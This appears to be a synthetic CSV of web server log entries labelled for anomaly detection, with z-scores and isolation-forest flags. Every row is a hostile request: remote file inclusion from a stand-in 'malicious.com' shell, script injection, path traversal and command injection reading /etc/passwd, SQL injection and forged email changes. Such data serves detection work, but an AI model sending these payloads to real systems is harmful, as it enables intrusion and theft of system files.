ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
110.36.169.151,2025-03-15 12:12:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,869,-1.4382684188879906,False,59,200,True,True
73.134.31.161,2025-03-15 12:11:41,GET /admin HTTP/1.1,403,4368,1.2483414498942,False,19,403,True,True
6.67.249.15,2025-03-15 12:12:27,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,649,-1.6071893023209949,False,59,200,True,True
157.221.182.150,2025-03-15 12:12:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1478,-0.9706647006575378,False,60,200,True,True
18.88.53.63,2025-03-15 12:12:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3749,0.7730595096895198,False,60,200,True,True
146.254.158.232,2025-03-15 12:12:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4743,1.53627477392773,False,60,200,True,True
84.4.151.231,2025-03-15 12:11:47,GET /admin HTTP/1.1,403,645,-1.6102605911106858,False,19,403,True,True
97.114.187.113,2025-03-15 12:12:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3141,0.3062236136564898,False,60,200,True,True
151.2.186.14,2025-03-15 12:12:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4475,1.330498425018434,False,51,403,True,True
152.18.54.213,2025-03-15 12:11:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3470,0.5588371166085735,False,60,200,True,True
191.205.203.5,2025-03-15 12:12:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,960,-1.3683965989225206,False,51,403,True,True
18.151.102.58,2025-03-15 12:12:15,GET /search?q=' OR '1'='1 HTTP/1.1,403,657,-1.601046724741613,False,34,403,True,True
99.44.218.184,2025-03-15 12:12:32,GET /execute?cmd=whoami HTTP/1.1,403,4945,1.6913748578071248,False,32,403,True,True
142.3.28.24,2025-03-15 12:11:40,GET /execute?cmd=whoami HTTP/1.1,403,565,-1.6716863669045054,False,32,403,True,True
131.81.15.29,2025-03-15 12:11:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4846,1.6153604602622729,False,60,200,True,True
236.227.182.222,2025-03-15 12:11:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3161,0.3215800576049448,False,60,200,True,True
243.193.221.112,2025-03-15 12:11:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,751,-1.5288714381838746,False,47,403,True,True
30.194.0.201,2025-03-15 12:12:20,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4407,1.2782865155936871,False,59,200,True,True
155.32.194.179,2025-03-15 12:11:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,1044,-1.3038995343390098,False,54,200,True,True
121.234.245.248,2025-03-15 12:12:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,507,-1.7162200543550248,False,51,403,True,True
152.53.56.51,2025-03-15 12:12:01,GET /admin HTTP/1.1,403,4603,1.4287796662885455,False,19,403,True,True
231.130.41.51,2025-03-15 12:12:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4559,1.3949954896019445,False,59,200,True,True
47.6.74.196,2025-03-15 12:11:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1883,-0.6596967107013254,False,60,200,True,True
54.111.249.140,2025-03-15 12:12:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3370,0.4820548968662988,False,60,200,True,True
96.174.152.191,2025-03-15 12:12:08,GET /search?q=' OR '1'='1 HTTP/1.1,403,589,-1.6532586341663595,False,34,403,True,True
84.92.195.103,2025-03-15 12:12:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,950,-1.3760748208967482,False,60,200,True,True
182.34.104.230,2025-03-15 12:12:35,GET /admin HTTP/1.1,403,4864,1.6291812598158824,False,19,403,True,True
204.232.70.170,2025-03-15 12:11:57,POST /change-email?email=attacker@example.com HTTP/1.1,200,3996,0.9627115924529382,False,54,200,True,True
8.124.17.99,2025-03-15 12:12:09,POST /change-email?email=attacker@example.com HTTP/1.1,200,708,-1.5618877926730528,False,54,200,True,True
47.0.18.245,2025-03-15 12:12:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,900,-1.4144659307678855,False,51,403,True,True
158.170.206.75,2025-03-15 12:12:26,POST /change-email?email=attacker@example.com HTTP/1.1,200,4847,1.6161282824596956,False,54,200,True,True
217.94.236.141,2025-03-15 12:12:23,GET /admin HTTP/1.1,403,4803,1.5823441057730947,False,19,403,True,True
49.197.176.169,2025-03-15 12:11:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1532,-0.9292023019967095,False,60,200,True,True
252.22.242.205,2025-03-15 12:11:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,4327,1.2168607397998674,False,54,200,True,True
86.237.140.16,2025-03-15 12:12:14,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,755,-1.5258001493941837,False,59,200,True,True
170.252.115.231,2025-03-15 12:12:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,979,-1.3538079771714884,False,59,200,True,True
166.7.209.214,2025-03-15 12:12:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,917,-1.4014129534116988,False,59,200,True,True
50.169.69.96,2025-03-15 12:12:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3899,0.8882328393029318,False,60,200,True,True
185.156.43.253,2025-03-15 12:12:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,572,-1.6663116115225463,False,59,200,True,True
158.184.119.5,2025-03-15 12:12:37,POST /change-email?email=attacker@example.com HTTP/1.1,200,3930,0.912035327423037,False,54,200,True,True
74.142.174.188,2025-03-15 12:12:08,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4535,1.3765677568637986,False,47,403,True,True
96.98.221.214,2025-03-15 12:12:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3634,0.684759956985904,False,60,200,True,True
238.235.95.24,2025-03-15 12:12:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4554,1.3911563786148309,False,60,200,True,True
48.138.23.66,2025-03-15 12:12:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,749,-1.5304070825787202,False,47,403,True,True
90.34.207.45,2025-03-15 12:12:00,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4719,1.5178470411895841,False,59,200,True,True
144.99.211.28,2025-03-15 12:12:30,POST /wp-json/wp/v2/users HTTP/1.1,403,621,-1.6286883238488317,False,34,403,True,True
89.22.34.78,2025-03-15 12:12:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,735,-1.5411565933426385,False,51,403,True,True
138.88.170.128,2025-03-15 12:11:45,GET /admin HTTP/1.1,403,794,-1.4958550836946967,False,19,403,True,True
53.145.167.29,2025-03-15 12:12:31,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4338,1.2253067839715175,False,59,200,True,True
136.163.125.182,2025-03-15 12:12:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,1064,-1.288543090390555,False,54,200,True,True
255.216.32.165,2025-03-15 12:11:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4938,1.6860001024251656,False,47,403,True,True
222.37.213.138,2025-03-15 12:11:56,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4838,1.609217882682891,False,51,403,True,True
202.128.24.226,2025-03-15 12:12:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1200,-1.1841192715410613,False,60,200,True,True
202.41.23.11,2025-03-15 12:12:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3069,0.2509404154420521,False,60,200,True,True
70.254.16.18,2025-03-15 12:12:31,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4721,1.5193826855844295,False,47,403,True,True
196.8.53.220,2025-03-15 12:12:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3628,0.6801530238013674,False,60,200,True,True
158.79.242.171,2025-03-15 12:12:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3578,0.6417619139302301,False,60,200,True,True
100.31.216.148,2025-03-15 12:12:06,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,514,-1.7108452989730656,False,47,403,True,True
229.218.123.168,2025-03-15 12:11:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1873,-0.6673749326755529,False,60,200,True,True
140.199.107.56,2025-03-15 12:12:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1173,-1.2048504708714756,False,60,200,True,True
192.1.79.161,2025-03-15 12:12:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1676,-0.818635905567834,False,60,200,True,True
100.239.101.205,2025-03-15 12:11:49,GET /admin HTTP/1.1,403,5000,1.7336050786653758,False,19,403,True,True
187.90.25.252,2025-03-15 12:12:28,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,684,-1.5803155254111987,False,59,200,True,True
251.65.226.105,2025-03-15 12:12:37,POST /change-email?email=attacker@example.com HTTP/1.1,200,4893,1.651448103541142,False,54,200,True,True
154.211.147.109,2025-03-15 12:12:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4711,1.5117044636102022,False,47,403,True,True
116.143.62.183,2025-03-15 12:12:20,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,917,-1.4014129534116988,False,59,200,True,True
224.165.13.142,2025-03-15 12:12:20,GET /admin HTTP/1.1,403,4994,1.7289981454808394,False,19,403,True,True
223.142.187.204,2025-03-15 12:12:13,POST /change-email?email=attacker@example.com HTTP/1.1,200,894,-1.419072863952422,False,54,200,True,True
68.142.4.188,2025-03-15 12:11:58,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1072,-1.282400512811173,False,59,200,True,True
128.122.246.110,2025-03-15 12:12:09,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,536,-1.6939532106297652,False,47,403,True,True
233.206.41.63,2025-03-15 12:12:34,POST /upload-xml HTTP/1.1,403,4912,1.6660367252921742,False,25,403,True,True
166.92.25.160,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,943,-1.3814495762787073,False,51,403,True,True
35.19.124.181,2025-03-15 12:12:12,POST /change-email?email=attacker@example.com HTTP/1.1,200,4943,1.6898392134122793,False,54,200,True,True
92.53.18.145,2025-03-15 12:11:51,GET /execute?cmd=whoami HTTP/1.1,403,563,-1.673222011299351,False,32,403,True,True
234.40.80.70,2025-03-15 12:12:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4546,1.385013801035449,False,60,200,True,True
195.36.59.146,2025-03-15 12:12:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,537,-1.6931853884323425,False,47,403,True,True
131.8.200.219,2025-03-15 12:12:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3689,0.726990177844155,False,60,200,True,True
138.92.36.5,2025-03-15 12:12:13,POST /wp-json/wp/v2/users HTTP/1.1,403,604,-1.6417413012050184,False,34,403,True,True
30.106.202.55,2025-03-15 12:11:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4830,1.603075305103509,False,47,403,True,True
37.186.78.215,2025-03-15 12:12:28,POST /change-email?email=attacker@example.com HTTP/1.1,200,4436,1.3005533593189467,False,54,200,True,True
26.38.81.15,2025-03-15 12:12:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,745,-1.533478371368411,False,47,403,True,True
20.123.139.137,2025-03-15 12:12:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,621,-1.6286883238488317,False,51,403,True,True
52.249.122.52,2025-03-15 12:12:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,518,-1.7077740101833747,False,60,200,True,True
146.233.84.212,2025-03-15 12:12:38,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,805,-1.4874090395230464,False,51,403,True,True
191.108.168.247,2025-03-15 12:12:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4891,1.6499124591462966,False,47,403,True,True
138.193.34.160,2025-03-15 12:12:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4871,1.6345560151978415,False,59,200,True,True
164.50.53.61,2025-03-15 12:12:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1547,-0.9176849690353683,False,60,200,True,True
248.42.247.233,2025-03-15 12:12:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4479,1.3335697138081248,False,60,200,True,True
161.140.54.54,2025-03-15 12:12:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,915,-1.4029485978065441,False,60,200,True,True
236.181.45.125,2025-03-15 12:12:49,POST /change-email?email=attacker@example.com HTTP/1.1,200,4485,1.3381766469926613,False,54,200,True,True
243.19.90.90,2025-03-15 12:12:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4058,1.0103165686931486,False,60,200,True,True
29.119.250.60,2025-03-15 12:12:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4771,1.5577737954555668,False,60,200,True,True
57.72.126.211,2025-03-15 12:12:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4336,1.2237711395766722,False,60,200,True,True
60.153.225.161,2025-03-15 12:12:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4651,1.4656351317648373,False,59,200,True,True
97.140.175.242,2025-03-15 12:12:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4716,1.5155435745973158,False,60,200,True,True
35.169.115.15,2025-03-15 12:12:41,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,540,-1.6908819218400741,False,47,403,True,True
196.162.137.121,2025-03-15 12:12:37,GET /admin HTTP/1.1,403,830,-1.4682134845874777,False,19,403,True,True
122.249.137.132,2025-03-15 12:12:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,531,-1.6977923216168789,False,51,403,True,True
193.90.184.186,2025-03-15 12:12:41,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4580,1.4111197557478223,False,59,200,True,True
33.12.80.56,2025-03-15 12:12:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4986,1.7228555679014574,False,59,200,True,True
249.81.185.211,2025-03-15 12:12:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1583,-0.8900433699281495,False,60,200,True,True
221.112.161.160,2025-03-15 12:12:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3198,0.34998947890958637,False,60,200,True,True
69.115.65.239,2025-03-15 12:12:38,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4665,1.4763846425287557,False,59,200,True,True
164.245.67.61,2025-03-15 12:12:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1136,-1.2332598921761173,False,60,200,True,True
231.12.239.229,2025-03-15 12:12:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,717,-1.554977392896248,False,60,200,True,True
220.93.102.102,2025-03-15 12:12:39,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,639,-1.6148675242952222,False,59,200,True,True
62.179.232.98,2025-03-15 12:12:59,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4459,1.31821326985967,False,47,403,True,True
30.233.187.119,2025-03-15 12:12:41,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,649,-1.6071893023209949,False,59,200,True,True
71.99.107.168,2025-03-15 12:12:25,GET /admin HTTP/1.1,403,4898,1.6552872145282558,False,19,403,True,True
156.203.77.210,2025-03-15 12:12:21,POST /change-email?email=attacker@example.com HTTP/1.1,200,4730,1.5262930853612342,False,54,200,True,True
18.79.46.68,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1020,-1.3223272670771558,False,51,403,True,True
217.131.173.18,2025-03-15 12:12:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1018,-1.3238629114720013,False,60,200,True,True
98.17.154.158,2025-03-15 12:12:52,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4912,1.6660367252921742,False,59,200,True,True
169.202.63.113,2025-03-15 12:12:47,GET /execute?cmd=whoami HTTP/1.1,403,627,-1.6240813906642952,False,32,403,True,True
75.191.167.53,2025-03-15 12:12:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4743,1.53627477392773,False,60,200,True,True
23.217.143.158,2025-03-15 12:12:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1333,-1.0819989192838362,False,60,200,True,True
51.95.233.199,2025-03-15 12:12:53,GET /admin HTTP/1.1,403,870,-1.4375005966905678,False,19,403,True,True
243.253.134.138,2025-03-15 12:12:52,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,813,-1.4812664619436644,False,47,403,True,True
252.105.111.170,2025-03-15 12:12:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1745,-0.7656561739456645,False,60,200,True,True
176.140.188.39,2025-03-15 12:12:42,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4749,1.5408817071122665,False,51,403,True,True
4.137.143.170,2025-03-15 12:12:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,653,-1.6041180135313038,False,60,200,True,True
